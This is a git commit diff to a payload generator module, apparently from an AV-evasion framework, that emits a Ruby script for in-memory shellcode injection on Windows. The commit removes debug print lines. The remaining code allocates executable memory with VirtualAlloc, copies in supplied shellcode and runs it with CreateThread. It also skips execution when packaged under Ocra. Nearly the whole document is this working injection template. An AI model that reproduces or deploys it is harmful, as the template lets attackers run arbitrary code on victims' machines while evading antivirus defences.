a63e580eb761f1895c4fe5e7e49bc8e30ca1059c
HarmJ0y <will@harmj0y.net>
2014-09-13 17:24:28 -0400

    module cleanup

--- modules/payloads/ruby/shellcode_inject/flat.py
+++ modules/payloads/ruby/shellcode_inject/flat.py
@@ -42,13 +42,9 @@ class Payload:
         payloadCode += "require 'win32/api'\n"
         payloadCode += "include Win32\n"
         payloadCode += "exit if Object.const_defined?(:Ocra)\n"
-        payloadCode += "puts 1\n"
         payloadCode += "v = API.new('VirtualAlloc', 'IIII', 'I');r = API.new('RtlMoveMemory', 'IPI', 'V');c = API.new('CreateThread', 'IIIIIP', 'I');w = API.new('WaitForSingleObject', 'II', 'I')\n"
-        payloadCode += "puts 2\n"
         payloadCode += "%s = \"%s\"\n" %(payloadName, Shellcode)
-        payloadCode += "puts 3\n"
         payloadCode += "%s = v.call(0,(%s.length > 0x1000 ? %s.length : 0x1000), 0x1000, 0x40)\n" %(ptrName,payloadName,payloadName)
-        payloadCode += "puts 4\n"
         payloadCode += "x = r.call(%s,%s,%s.length); %s = c.call(0,0,%s,0,0,0); x = w.call(%s,0xFFFFFFF)\n" %(ptrName,payloadName,payloadName,threadName,ptrName,threadName)
 
         return payloadCode
